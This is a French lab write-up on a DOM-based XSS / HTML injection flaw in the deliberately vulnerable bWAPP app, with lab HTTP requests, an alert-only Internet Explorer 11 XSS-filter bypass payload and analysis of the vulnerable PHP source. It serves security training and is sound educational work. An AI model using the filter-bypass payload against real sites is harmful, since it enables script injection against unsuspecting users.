# Niveau "Medium"

## Exploitation

L'URL est ici réfléchie au sein de la page en utilisant la méthode HTTP `GET` :&#x20;

```http
GET /bWAPP/htmli_current_url.php?parametre=valeur HTTP/1.1
Host: 192.168.56.116
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Cookie: security_level=1; PHPSESSID=2f4611482fb97564af7dbe4243dca828
Connection: close
```

![](<../../../../../.gitbook/assets/image (23).png>)

La récupération de l'URL s'effectue non plus en PHP mais grâce à du Javascript et la méthode `document.write()` de la variable `document.URI` :&#x20;

```html
<i>
  <script>document.write(document.URL)</script>
  "http://192.168.56.116/bWAPP/htmli_current_url.php?parametre=valeur"
</i>
```

Il est donc ici possible d'afficher les paramètres de type ancre :&#x20;

![](<../../../../../.gitbook/assets/image (16).png>)

Les navigateurs récents encodent l'URL, cela a pour conséquence qu'il est pas possible d'exploiter directement la vulnérabilité. Internet Explorer 11 n'effectue pas cet encodage sur les nom et valeur des paramètres d'URL, par contre il possède un filtre anti-XSS pouvant empêcher l'exécution de script malicieux :&#x20;

![](<../../../../../.gitbook/assets/image (5).png>)

Il existe un contournement fonctionnel sur IE permettant tout de même d'exécuter le code :&#x20;

```http
GET /bWAPP/htmli_current_url.php?parametre=<script/%00%00v%00%00>alert('XSS')</script> HTTP/1.1
Accept: text/html, application/xhtml+xml, image/jxr, */*
Host: 192.168.56.116
Cookie: PHPSESSID=5259cd672a0fb988f6f618b8527b1a8c; security_level=0
Connection: close
```

![](<../../../../../.gitbook/assets/image (10) (1).png>)

Il est également possible d'exécuter du code HTML/Javascript sans utiliser de contournement spécifique à IE11 mais en utilisant les ancres :&#x20;

```http
GET /bWAPP/htmli_current_url.php HTTP/1.1
Accept: text/html, application/xhtml+xml, image/jxr, */*
Host: 192.168.56.116
Cookie: PHPSESSID=5259cd672a0fb988f6f618b8527b1a8c; security_level=1
Connection: close
```

![](<../../../../../.gitbook/assets/image (6).png>)

Etant donné que la valeur de l'URL est récupérée au niveau du client (par du code Javascript, c'est donc une vulnérabilité Dom-based) l'interception et la modification de l'URL ne fonctionnera pas.

A noter qu'il est possible d'injecter le champ également le champ Host mais sans succès après quelques tests (excepté via interception avec un proxy) :&#x20;

![](<../../../../../.gitbook/assets/image (17).png>)

## Analyse du code source

L'application affiche le contenu de la variable `$url` au d'une balise `<i></i>` :

{% code title="htmli_current_url.php" %}
```php
<div id="man">
  <h1>HTML Injection - Reflected (URL)</h1>
  <?php echo "<p align=\"left\">Your current URL: <i>" . $url . "</i></p>";?>
</div>
```
{% endcode %}

La variable `$url` est construite de la manière suivante :&#x20;

{% code title="htmli_current_url.php" %}
```php
$url= "";

switch($_COOKIE["security_level"]) {
  case "0" :
    // $url = "http://" . $_SERVER["HTTP_HOST"] . urldecode($_SERVER["REQUEST_URI"]);
    $url = "http://" . $_SERVER["HTTP_HOST"] . $_SERVER["REQUEST_URI"];
    break;
  case "1" :
    $url = "<script>document.write(document.URL)</script>";
    break;
  case "2" :
    $url = "http://" . $_SERVER["HTTP_HOST"] . xss_check_3($_SERVER["REQUEST_URI"]);
    break;
  default :
    // $url = "http://" . $_SERVER["HTTP_HOST"] . urldecode($_SERVER["REQUEST_URI"]);
    $url = "http://" . $_SERVER["HTTP_HOST"] . $_SERVER["REQUEST_URI"];
    break;
}
```
{% endcode %}

Le level "Medium" correspond à la valeur 1, c'est à dire qu'ici, la variable `$url` est construite de la façon suivante :

```php
$url = "<script>document.write(document.URL)</script>";
```

Il s'agit donc d'une injection XSS basée sur le Dom (également nommée Type-0) car l'information est récupérée directement depuis l'URL affichée dans le navigateur de l'utilisateur (et non celle envoyée au serveur).
